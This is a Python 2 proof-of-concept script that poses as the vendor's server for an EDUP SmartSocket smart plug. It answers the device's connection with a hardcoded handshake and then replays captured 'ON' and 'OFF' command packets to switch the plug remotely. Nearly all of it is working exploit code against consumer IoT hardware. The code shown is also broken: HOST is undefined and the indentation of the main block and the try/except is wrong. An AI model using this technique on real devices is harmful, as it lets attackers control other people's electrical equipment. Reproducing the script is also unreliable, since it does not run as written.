#!/usr/bin/env python
# Python Fake EDUP Server POC
# Angel Suarez-B. Martin (n0w)
# http://www.freebuf.com/articles/terminal/69432.html
import socket
import sys
from thread import *
import time
# EDUP SmartSocket Port
PORT = 221
def clientthread(conn):
    serverHelo = 'ffff000f01007ac82cca004139164e'.decode('hex')  
    onCMD = 'ffff00156261a73ac50f0900002509062474028080'.decode('hex')
    offCMD = 'ffff001548e18d202bf50900002509062474028000'.decode('hex')    
    
    print "[*] Sending HELO..."    
    conn.send(serverHelo)
    data = conn.recv(30)    
    print "[i] Received message A!: " + data.encode('hex')
    data = conn.recv(30)    
    print "[i] Received message B!: " + data.encode('hex')    
    print "[i] Session now started"
    
    print "[*] Sending 'ON' CMD..."
    conn.send(onCMD)  
    
    data = conn.recv(30)    
    print "[i] Received 'ON' CMD confirmation: " + data.encode('hex')
    
    time.sleep (3)    
    print "[*] Now sending 'OFF' CMD..."
    conn.send(offCMD)
    
    data = conn.recv(30)    
    print "[i] Received 'OFF' CMD confirmation: " + data.encode('hex')
    conn.close()
    if __name__ == '__main__':    
 print "EDUP SmartSocket Fake Server PoC"
 print "Written by Angel Suarez-B. Martin (n0w)\n"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
 print '[i] Socket created'
  
 # Bind socket to local host and port
 try:
  s.bind((HOST, PORT)) 
  except socket.error as msg:  
  print '[e] Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
  sys.exit()   
 print '[i] Socket bind complete'
 s.listen(10) 
 print '[i] Socket now listening'
  
 while 1:
  conn, addr = s.accept()  
  print '[i] Incoming SmartSocket from ' + addr[0] + ':' + str(addr[1])
  
  start_new_thread(clientthread ,(conn,))
  
 s.close()
